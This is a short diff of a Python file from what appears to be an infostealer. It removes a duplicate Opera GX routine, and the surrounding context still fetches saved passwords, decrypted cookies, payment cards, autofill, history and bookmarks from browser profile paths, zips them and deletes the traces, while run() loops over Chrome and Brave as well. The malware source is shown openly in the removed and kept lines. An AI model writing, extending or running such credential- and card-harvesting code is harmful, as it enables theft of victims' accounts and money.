@@ -459,21 +459,7 @@ def opera_gx():
     u.zip("OperaGX.zip", ["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
     u.delete_files(["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
     
-    
-def opera_gx():
-    fetch_passwords(r"AppData\Local\Opera Software\Opera GX Stable\User Data\Default\Login Data", r"AppData\Local\Opera Software\Opera GX Stable\User Data\Local State")
-    decrypt_fetch_cookies(r"AppData\Local\Opera Software\Opera GX Stable\User Data\Default\Network\Cookies", r"AppData\Local\Opera Software\Opera GX Stable\User Data\Local State")
-    fetch_cookies(r"AppData\Local\Opera Software\Opera GX Stable\User Data\Default\Network\Cookies")
-    fetch_history(r"AppData\Local\Opera Software\Opera GX Stable\User Data\Default\History")
-    fetch_downloads(r"AppData\Local\Opera Software\Opera GX Stable\User Data\Default\History")
-    fetch_bookmarks(r"AppData\Local\Opera Software\Opera GX Stable\User Data\Default\Bookmarks")
-    fetch_payment(r"AppData\Local\Opera Software\Opera GX Stable\User Data\Default\Web Data", r"AppData\Local\Opera Software\Opera GX Stable\User Data\Local State")
-    fetch_autofill(r"AppData\Local\Opera Software\Opera GX Stable\User Data\Default\Web Data")
-    
-    u.zip("OperaGX.zip", ["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
-    u.delete_files(["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
-    
-    
+        
 def run():
     chrome()
     brave()
